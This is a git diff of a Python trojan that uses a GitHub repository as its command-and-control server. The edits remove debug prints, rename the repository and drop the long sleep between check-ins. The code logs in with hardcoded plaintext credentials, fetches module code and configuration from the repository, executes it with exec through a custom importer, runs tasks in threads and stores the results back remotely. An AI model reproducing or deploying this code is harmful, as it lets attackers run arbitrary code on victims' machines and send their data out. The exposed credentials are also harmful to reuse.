@@ -8,7 +8,7 @@ import threading
 import Queue
 import os
 
-from github3 import login
+from github3 import *
 
 trojan_id = "abc"
 
@@ -40,8 +40,7 @@ class GitImporter(object):
     def load_module(self, name):
 
         module = imp.new_module(name)
-        print("laaaaaaaaaaaaaaaaaaaaaaaaaaaa")
-        print(module)
+        
 
         exec self.current_module_code in module.__dict__
 
@@ -52,9 +51,9 @@ class GitImporter(object):
 
 def connect_to_github():
     gh = login(username="OXVyeah", password="heiya233")
-    print(gh)
-    repo = gh.repository("OXVyeah", "yayade")
-    print(repo)
+    #print(gh)
+    repo = gh.repository("OXVyeah", "TROyeah")
+    #print(repo)
     branch = repo.branch("master")
 
     return gh, repo, branch
@@ -91,6 +90,7 @@ def get_trojan_config():
 
         if task['module'] not in sys.modules:
             exec ("import %s" % task['module'])
+       
         print(task)
     return config
 
@@ -108,7 +108,7 @@ def store_module_result(data):
 def module_runner(module):
     task_queue.put(1)
     print("==========================")
-    print(sys.modules)
+    #print(sys.modules)
     result = sys.modules[module].run()
 
     task_queue.get()
@@ -129,8 +129,7 @@ while True:
         config = get_trojan_config()
 
         for task in config:
+            
             t = threading.Thread(target=module_runner, args=(task['module'],))
             t.start()
             time.sleep(random.randint(1, 10))
-
-    time.sleep(random.randint(1000, 10000))
